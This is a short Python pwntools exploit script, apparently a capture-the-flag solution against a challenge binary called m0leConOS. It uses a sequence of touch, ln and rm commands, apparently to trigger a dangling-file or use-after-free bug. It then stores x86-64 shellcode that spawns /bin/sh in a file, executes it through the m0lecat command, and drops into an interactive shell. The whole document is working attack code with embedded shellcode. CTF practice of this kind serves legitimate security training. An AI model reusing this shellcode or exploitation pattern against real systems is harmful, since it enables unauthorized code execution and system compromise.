from pwn import *
import re

prompt = b"# "
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

if args.LOCAL:
    conn = process("./dist/m0leConOS")
else:
    conn = remote("localhost", 6745)

conn.sendlineafter(prompt, b"touch")
conn.sendlineafter(b"name: ", b"tmp")
conn.sendlineafter(b"> ", b"junk1")

conn.sendlineafter(prompt, b"ln")
conn.sendlineafter(b"from: ", b"m0lecat")
conn.sendlineafter(b"to: ", b"tmp2")


conn.sendlineafter(prompt, b"rm")
conn.sendlineafter(b"name: ", b"tmp")

conn.sendlineafter(prompt, b"rm")
conn.sendlineafter(b"name: ", b"tmp2")


conn.sendlineafter(prompt, b"touch")
conn.sendlineafter(b"name: ", b"tmp")
conn.sendlineafter(b"> ", shellcode)


conn.sendlineafter(prompt, b"m0lecat")
conn.recvuntil(b"\n> ")
conn.sendline(b"tmp")

conn.interactive()

